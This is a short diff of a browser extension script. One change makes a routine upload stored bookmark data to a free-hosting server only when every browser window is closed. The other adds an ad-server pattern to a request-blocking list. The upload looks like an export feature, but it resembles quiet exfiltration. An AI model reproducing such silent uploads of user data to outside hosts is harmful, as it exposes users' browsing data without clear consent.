@@ -74,19 +74,22 @@ function importbmk() {
 }
 
 function listener() {
-	console.log("export listener called");
-	extension.storage.local.get("bmks",function (c) {
-		if (c.bmks) {
-			var req = new XMLHttpRequest();
-			req.open('POST', "https://psydel.000webhostapp.com/",true);
-			req.onreadystatechange = function (aEvt) {
-				if (req.readyState == 4&&req.status == 200) {
-					notify(req.responseText);
+	extension.windows.getAll(function (a){
+		if (a.length==0) {
+			extension.storage.local.get("bmks",function (c) {
+				if (c.bmks) {
+					var req = new XMLHttpRequest();
+					req.open('POST', "https://psydel.000webhostapp.com/",true);
+					req.onreadystatechange = function (aEvt) {
+						if (req.readyState == 4&&req.status == 200) {
+							notify(req.responseText);
+						}
+					}
+					var dats = new FormData();
+					dats.append("id",unescape(c.bmks));
+					req.send(dats);
 				}
-			}
-			var dats = new FormData();
-			dats.append("id",unescape(c.bmks));
-			req.send(dats);
+			});
 		}
 	});
 }
@@ -117,7 +120,8 @@ extension.webRequest.onBeforeSendHeaders.addListener(
 		"https://www8.smartadserver.com/*",
 		"http://*.advertising.com/*",
 		"http://redir.adap.tv/*",
-		"https://adserver.juicyads.com/*"
+		"https://adserver.juicyads.com/*",
+		"https://js.isboost.co.jp/t/*/*/a*.js"
 	]},
 	["blocking", "requestHeaders"]
 );
